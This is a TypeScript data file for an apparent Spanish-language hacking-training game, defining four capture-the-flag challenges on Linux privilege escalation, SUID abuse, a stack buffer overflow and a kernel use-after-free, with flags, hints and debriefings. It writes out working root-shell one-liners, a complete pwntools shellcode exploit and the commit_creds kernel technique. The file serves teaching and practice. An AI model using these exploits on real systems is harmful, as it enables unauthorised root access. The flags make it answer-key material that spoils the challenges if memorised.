/**
 * HackQuest – Systems Branch
 * 4 challenges (progressive difficulty)
 *
 * All briefings/debriefings are in Spanish. Military/spy narrative tone.
 * Flags follow the pattern HACKQUEST{...}.
 */

import type { ChallengeData } from "@/types/game";

export const systemsChallenges = [
  // ================================================================
  // 1. Linux Privilege Escalation
  // ================================================================
  {
    slug: "sys-privesc-linux",
    title: "Linux Privilege Escalation",
    description:
      "Partiendo de un shell de usuario sin privilegios, escala hasta root usando técnicas clásicas de privilege escalation en Linux.",
    branch: "SYSTEMS",
    difficulty: "EASY",
    type: "PUZZLE",
    timeLimitSeconds: 900,
    basePoints: 120,
    requiredRank: "JUNIOR",
    isFree: true,
    orderInBranch: 1,

    briefing: `
OPERACIÓN: ROOT HUNTER
CLASIFICACIÓN: RESTRINGIDA
AGENTE: TÚ
OBJETIVO: Servidor Linux comprometido de ATLAS Corp

Has conseguido acceso inicial al servidor de producción de ATLAS Corp
mediante credenciales débiles de un usuario de bajo privilegio (www-data).
Ahora necesitas escalar privilegios para acceder a los documentos confidenciales
almacenados en /root/.

Tu misión: encuentra el vector de escalada de privilegios y obtén acceso root.
La bandera se encuentra en /root/flag.txt.

Tienes acceso SSH como usuario: operator / P@ssw0rd123
Objetivo: convertirte en root.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – ROOT HUNTER

TÉCNICA UTILIZADA: Linux Privilege Escalation

La escalada de privilegios en Linux explota configuraciones incorrectas,
binarios con permisos especiales o vulnerabilidades del kernel para
obtener acceso de superusuario (root).

VECTORES PRINCIPALES:

1. SUDO MAL CONFIGURADO:
   sudo -l → muestra qué comandos puede ejecutar el usuario como root.
   Si sudo permite vim, python, find, etc. → escalada trivial.
   Referencia: https://gtfobins.github.io

2. SUID BINARIES:
   find / -perm -4000 -type f 2>/dev/null
   Binarios con SUID ejecutan con los privilegios del propietario (root).
   find, vim, python con SUID → shell root.

3. WRITABLE /etc/passwd o /etc/shadow:
   Añadir usuario con hash conocido directamente.

4. CRON JOBS:
   crontab -l && cat /etc/cron* → scripts ejecutados por root editables.

5. CAPABILITIES:
   getcap -r / 2>/dev/null → binarios con capabilities peligrosas.
   cap_setuid permite cambiar UID a root.

HERRAMIENTAS DE ENUMERACIÓN:
  LinPEAS: ./linpeas.sh
  LinEnum: ./LinEnum.sh
  sudo -l (siempre primera comprobación)

GTFOBINS:
  Referencia definitiva de binarios Linux para escalada: https://gtfobins.github.io
    `.trim(),

    flag: "HACKQUEST{r00t_4cc3ss_gr4nt3d}",

    phases: [
      {
        name: "Enumeración de privilegios",
        description:
          "Enumera los privilegios actuales del usuario y busca configuraciones incorrectas.",
        expectedCommands: [
          "sudo -l",
          "id",
          "whoami",
          "find / -perm -4000 -type f 2>/dev/null",
        ],
        hints: [
          "Empieza siempre con: id, whoami, sudo -l. Son los tres primeros pasos.",
          "sudo -l muestra los comandos que puedes ejecutar como root. Busca entradas NOPASSWD.",
          "find / -perm -4000 -type f 2>/dev/null lista todos los binarios con bit SUID.",
        ],
      },
      {
        name: "Identificar el vector de escalada",
        description:
          "Analiza los resultados de la enumeración para identificar el vector explotable.",
        expectedCommands: [
          "sudo -l",
          "ls -la /usr/bin/vim",
          "getcap -r / 2>/dev/null",
        ],
        hints: [
          "Si sudo -l muestra /usr/bin/python3 NOPASSWD, puedes escalar con: sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
          "Si hay un SUID en /usr/bin/find: find . -exec /bin/bash -p \\; -quit",
          "Consulta GTFOBins para cada binario que encuentres con sudo o SUID.",
        ],
      },
      {
        name: "Obtener shell root y leer la flag",
        description:
          "Explota el vector identificado para obtener una shell root y leer /root/flag.txt.",
        expectedCommands: [
          "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
          "cat /root/flag.txt",
        ],
        hints: [
          "Una vez con shell root (prompt #), lee la flag: cat /root/flag.txt",
          "Verifica que eres root: id debe mostrar uid=0(root).",
          "Si usas sudo python3: sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        ],
      },
    ],
  },

  // ================================================================
  // 2. SUID Exploitation
  // ================================================================
  {
    slug: "sys-suid",
    title: "SUID Exploitation",
    description:
      "Encuentra y explota un binario con el bit SUID mal configurado para escalar privilegios hasta root en un servidor Linux.",
    branch: "SYSTEMS",
    difficulty: "MEDIUM",
    type: "PUZZLE",
    timeLimitSeconds: 900,
    basePoints: 200,
    requiredRank: "JUNIOR",
    isFree: false,
    orderInBranch: 2,

    briefing: `
OPERACIÓN: STICKY BIT
CLASIFICACIÓN: CONFIDENCIAL
AGENTE: TÚ
OBJETIVO: Servidor de staging de NEXUS Technologies

Acceso inicial obtenido en el servidor de staging de NEXUS Technologies
como usuario "deployer". Los documentos confidenciales del proyecto AURORA
están protegidos en /root/aurora/.

El equipo de infraestructura configuró varios binarios con SUID para
facilitar el despliegue automatizado. Sospechamos que alguno es explotable.

Tu misión: identifica el binario SUID vulnerable y úsalo para obtener
acceso root. Los documentos de AURORA contienen la bandera.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – STICKY BIT

TÉCNICA UTILIZADA: SUID Bit Exploitation

El bit SUID (Set User ID) es un permiso especial de Unix que permite
ejecutar un programa con los privilegios del propietario del archivo,
no del usuario que lo ejecuta. Si un binario con SUID es propiedad de root,
se ejecutará como root independientemente de quién lo invoque.

IDENTIFICACIÓN:
  ls -la /usr/bin/find → -rwsr-xr-x (la 's' en lugar de 'x' indica SUID)
  find / -perm -4000 -user root -type f 2>/dev/null

BINARIOS SUID COMÚNMENTE EXPLOTABLES (GTFOBins):
  find:   find . -exec /bin/bash -p \\; -quit
  vim:    vim -c ':!/bin/bash'  (si tiene SUID)
  python: python -c 'import os; os.execl("/bin/sh","sh","-p")'
  bash:   /bin/bash -p          (conserva EUID=0)
  cp:     copiar /etc/passwd y añadir usuario root
  nmap:   nmap --interactive → !sh  (versiones antiguas)
  awk:    awk 'BEGIN{system("/bin/bash -p")}'

DIFERENCIA ENTRE EUID Y UID:
  -p en bash conserva el UID efectivo (EUID) heredado del SUID.
  Sin -p, bash resetea el EUID al UID real del usuario actual.

IMPACTO REAL:
  Configurar SUID en cualquier intérprete (python, perl, ruby)
  o herramienta de sistema (find, cp, tar) es un vector de escalada trivial.

DEFENSA:
  Auditar regularmente: find / -perm -4000 -type f
  Eliminar SUID de binarios que no lo requieran: chmod u-s /usr/bin/find
  Usar sudo con comandos específicos en lugar de SUID.
    `.trim(),

    flag: "HACKQUEST{su1d_b1n_3xpl01t3d}",

    phases: [
      {
        name: "Buscar binarios con SUID",
        description:
          "Enumera todos los binarios con el bit SUID activado en el sistema.",
        expectedCommands: [
          "find / -perm -4000 -user root -type f 2>/dev/null",
          "find / -perm -u=s -type f 2>/dev/null",
        ],
        hints: [
          "El bit SUID se busca con -perm -4000 en find.",
          "Comando: find / -perm -4000 -user root -type f 2>/dev/null",
          "Redirige los errores a /dev/null para una salida limpia. Busca binarios en /usr/bin y /bin.",
        ],
      },
      {
        name: "Identificar el binario vulnerable",
        description:
          "Consulta GTFOBins para cada binario encontrado con SUID y determina cuál es explotable.",
        expectedCommands: [
          "ls -la /usr/bin/find",
          "ls -la /usr/bin/python3",
          "which find python3 vim awk",
        ],
        hints: [
          "Comprueba si find tiene SUID: ls -la $(which find). La 's' en permisos confirma SUID.",
          "Consulta https://gtfobins.github.io/ para el binario encontrado.",
          "Los candidatos más comunes: find, python3, vim, nmap, awk, perl.",
        ],
      },
      {
        name: "Explotar el SUID para root",
        description:
          "Ejecuta el exploit para el binario SUID identificado y obtén la shell root.",
        expectedCommands: [
          "find . -exec /bin/bash -p \\; -quit",
          "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
        ],
        hints: [
          "Para find con SUID: find . -exec /bin/bash -p \\; -quit",
          "Para python3 con SUID: python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
          "La opción -p preserva los privilegios de root. Verifica con: id → uid=deployer(1001) euid=root(0)",
        ],
      },
    ],
  },

  // ================================================================
  // 3. Buffer Overflow Básico
  // ================================================================
  {
    slug: "sys-bof-basic",
    title: "Buffer Overflow Básico",
    description:
      "Explota un buffer overflow en un binario x86 sin protecciones para redirigir la ejecución a tu shellcode y obtener una shell root.",
    branch: "SYSTEMS",
    difficulty: "HARD",
    type: "PUZZLE",
    timeLimitSeconds: 1800,
    basePoints: 350,
    requiredRank: "PENTESTER",
    isFree: false,
    orderInBranch: 3,

    briefing: `
OPERACIÓN: STACK SMASHER
CLASIFICACIÓN: ALTO SECRETO
AGENTE: TÚ
OBJETIVO: Binario vulnerable en servidor de CYPHER Industries

El equipo de reversing ha identificado un binario con SUID root
en el servidor de CYPHER Industries que tiene un buffer overflow clásico.
El binario fue compilado sin protecciones (sin ASLR, sin stack canary, con stack ejecutable).

Binario: /opt/cypher/vuln_service
El programa lee input del usuario en un buffer de 64 bytes sin verificar el tamaño.

Tu misión: construye un exploit que desborde el buffer, sobreescriba el return address
y ejecute shellcode para obtener una shell root.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – STACK SMASHER

TÉCNICA UTILIZADA: Stack Buffer Overflow (ret2shellcode)

Un buffer overflow ocurre cuando se escribe más datos en un buffer de los que puede contener,
sobrescribiendo datos adyacentes en la pila, incluyendo el saved return address (RIP/EIP).

ESTRUCTURA DE LA PILA (stack frame):
  [buffer 64 bytes][padding][saved EBP (4 bytes)][saved EIP (4 bytes)] → dirección de retorno

PASOS DEL EXPLOIT:
  1. Determinar el offset hasta el return address (gdb, cyclic pattern).
  2. Encontrar la dirección del buffer en memoria.
  3. Colocar shellcode al inicio del buffer.
  4. Sobreescribir el return address con la dirección del buffer.

HERRAMIENTAS:
  gdb + peda/pwndbg → análisis del binario.
  python3 pwntools → construcción del exploit.
  ROPgadget → para técnicas ROP.
  cyclic de pwntools → encontrar offset.

EJEMPLO BÁSICO CON PWNTOOLS:
  from pwn import *
  p = process('./vuln_service')
  offset = 68  # 64 buffer + 4 saved EBP
  shellcode = asm(shellcraft.sh())
  buf_addr = 0xffffd5c0  # dirección del buffer (gdb)
  payload = shellcode + b'A' * (offset - len(shellcode)) + p32(buf_addr)
  p.sendline(payload)
  p.interactive()

PROTECCIONES MODERNAS (contramedidas):
  ASLR: aleatoriza las direcciones de memoria.
  Stack Canary: valor secreto antes del EIP, detecta sobrescrituras.
  NX/DEP: marca la pila como no ejecutable.
  PIE: posición independiente del ejecutable.
    `.trim(),

    flag: "HACKQUEST{buff3r_0v3rfl0w_pwn3d}",

    phases: [
      {
        name: "Análisis del binario vulnerable",
        description:
          "Examina el binario para entender su comportamiento y verificar la ausencia de protecciones.",
        expectedCommands: [
          "checksec --file=/opt/cypher/vuln_service",
          "file /opt/cypher/vuln_service",
          "strings /opt/cypher/vuln_service",
        ],
        hints: [
          "checksec muestra las protecciones del binario: ASLR, canary, NX, PIE.",
          "Un binario vulnerable tendrá: No canary, NX disabled, No PIE.",
          "strings puede revelar funciones usadas (gets, strcpy) que son vulnerables a BOF.",
        ],
      },
      {
        name: "Determinar el offset hasta el return address",
        description:
          "Usa un patrón cíclico para encontrar exactamente cuántos bytes necesitas antes de sobreescribir el EIP.",
        expectedCommands: [
          "python3 -c \"from pwn import *; print(cyclic(200))\" | ./vuln_service",
          "gdb ./vuln_service",
        ],
        hints: [
          "Genera un patrón cíclico con pwntools: python3 -c 'from pwn import *; print(cyclic(200))'",
          "En GDB, cuando el programa crashea, el EIP contendrá parte del patrón. cyclic_find(EIP) da el offset.",
          "Típico offset = tamaño_buffer + 4 (saved EBP). Con buffer de 64 bytes: offset = 68.",
        ],
      },
      {
        name: "Construir y ejecutar el exploit",
        description:
          "Escribe el exploit completo con shellcode, padding y return address para obtener la shell root.",
        expectedCommands: [
          "python3 exploit.py",
          "python3 -c \"from pwn import *; ...\" | ./vuln_service",
        ],
        hints: [
          "Estructura del payload: shellcode + padding_hasta_offset + p32(dir_buffer)",
          "Obtén la dirección del buffer con GDB: info frame cuando estás en la función vulnerable.",
          "Script: from pwn import *; p=process('./vuln_service'); payload=asm(shellcraft.sh())+b'A'*(68-len(asm(shellcraft.sh())))+p32(0xffffd5c0); p.sendline(payload); p.interactive()",
        ],
      },
    ],
  },

  // ================================================================
  // 4. Kernel Module Exploitation
  // ================================================================
  {
    slug: "sys-kernel",
    title: "Kernel Module Exploitation",
    description:
      "Explota una vulnerabilidad en un módulo del kernel Linux para escalar privilegios directamente desde ring3 a ring0 y obtener control total del sistema.",
    branch: "SYSTEMS",
    difficulty: "EXPERT",
    type: "PUZZLE",
    timeLimitSeconds: 2400,
    basePoints: 500,
    requiredRank: "RED_TEAM",
    isFree: false,
    orderInBranch: 4,

    briefing: `
OPERACIÓN: RING ZERO
CLASIFICACIÓN: MÁXIMO SECRETO
AGENTE: TÚ
OBJETIVO: Servidor de control de infraestructura crítica TEMPEST Systems

TEMPEST Systems gestiona la infraestructura de distribución eléctrica de la región.
Su servidor central ejecuta un módulo del kernel personalizado (/dev/tempest_ctrl)
que tiene una vulnerabilidad de use-after-free en el manejo de ioctl.

El módulo lleva 3 años en producción sin auditar. Nuestro equipo de reversing
encontró la vulnerabilidad. Ahora necesitamos un exploit funcional.

Tu misión: explota la vulnerabilidad del módulo del kernel para escalar
de usuario sin privilegios a root mediante manipulación directa de estructuras
del kernel. La bandera está en /root/tempest_flag.txt.

Esta es la operación más técnicamente avanzada que habrás ejecutado.
    `.trim(),

    debriefing: `
ANÁLISIS POST-OPERACIÓN – RING ZERO

TÉCNICA UTILIZADA: Kernel Module Exploitation (Use-After-Free → LPE)

La explotación del kernel es la forma más impactante de escalada de privilegios.
Un bug en un módulo del kernel puede comprometer completamente el sistema,
bypassing todas las protecciones de espacio de usuario.

CONCEPTOS FUNDAMENTALES:
  Ring0 (Kernel): acceso total al hardware y memoria.
  Ring3 (Userland): acceso restringido, mediado por syscalls.
  LPE: Local Privilege Escalation — de usuario a root/kernel.

TIPOS DE VULNERABILIDADES DE KERNEL:
  - Use-After-Free (UAF): usar memoria liberada → control del flujo.
  - Buffer Overflow en kernel: sobreescribir estructuras del kernel.
  - Race Conditions: TOCTOU en operaciones del kernel.
  - Null Pointer Dereference: mapear página 0 y ejecutar código.

OBJETIVO DEL EXPLOIT (UAF):
  1. Asignar objeto del kernel.
  2. Liberar el objeto (free).
  3. Antes de que el kernel lo zeroise, asignar objeto controlado en el mismo espacio.
  4. El código del kernel usa el objeto "liberado" que ahora controlamos.
  5. Sobreescribir cred->uid = 0 para obtener root.

ESTRUCTURA CRÍTICA: struct cred
  current_task->cred->uid = 0  → usuario es root
  commit_creds(prepare_kernel_cred(0)) → técnica clásica

HERRAMIENTAS:
  /proc/kallsyms → dirección de símbolos del kernel (requiere root para leer)
  dmesg → mensajes del kernel (crashes, oops)
  pahole → analiza estructuras del kernel
  pwndbg con kernel debug

PROTECCIONES MODERNAS DEL KERNEL:
  SMEP: impide ejecutar código de userland en kernel mode.
  SMAP: impide acceder a memoria de userland desde kernel mode.
  KASLR: aleatoriza la base del kernel.
  kASLR + SMEP + SMAP: requieren técnicas ROP con gadgets del kernel.
    `.trim(),

    flag: "HACKQUEST{k3rn3l_m0dul3_0wn3d}",

    phases: [
      {
        name: "Análisis del módulo del kernel",
        description:
          "Examina el módulo vulnerable para entender su interfaz ioctl y la vulnerabilidad UAF.",
        expectedCommands: [
          "ls -la /dev/tempest_ctrl",
          "strings /lib/modules/$(uname -r)/kernel/drivers/tempest_ctrl.ko",
          "dmesg | tail -20",
        ],
        hints: [
          "Empieza identificando el dispositivo: ls -la /dev/tempest_ctrl",
          "strings sobre el módulo .ko revela los nombres de funciones y mensajes de debug.",
          "dmesg muestra mensajes del kernel incluyendo los del módulo cuando se carga.",
        ],
      },
      {
        name: "Implementar el trigger de la vulnerabilidad",
        description:
          "Escribe código C que reproduzca la condición de use-after-free mediante llamadas ioctl específicas.",
        expectedCommands: [
          "gcc -o exploit exploit.c",
          "./exploit",
          "dmesg | grep -i 'tempest\\|oops\\|bug'",
        ],
        hints: [
          "El UAF se activa con: ioctl(fd, TEMPEST_ALLOC), ioctl(fd, TEMPEST_FREE), ioctl(fd, TEMPEST_USE)",
          "Tras el free, necesitas ocupar el hueco de memoria con datos controlados antes del USE.",
          "Usa open(/dev/tempest_ctrl), ioctl para las operaciones, y verifica crashes en dmesg.",
        ],
      },
      {
        name: "Escalar privilegios a root",
        description:
          "Completa el exploit para ejecutar commit_creds(prepare_kernel_cred(0)) y obtener shell root.",
        expectedCommands: [
          "./exploit_full",
          "id",
          "cat /root/tempest_flag.txt",
        ],
        hints: [
          "El objetivo es ejecutar: commit_creds(prepare_kernel_cred(0)) desde el contexto del kernel.",
          "Obtén las direcciones de commit_creds y prepare_kernel_cred de /proc/kallsyms (con permisos).",
          "Una vez con root: id debe mostrar uid=0(root), luego: cat /root/tempest_flag.txt",
        ],
      },
    ],
  },
];
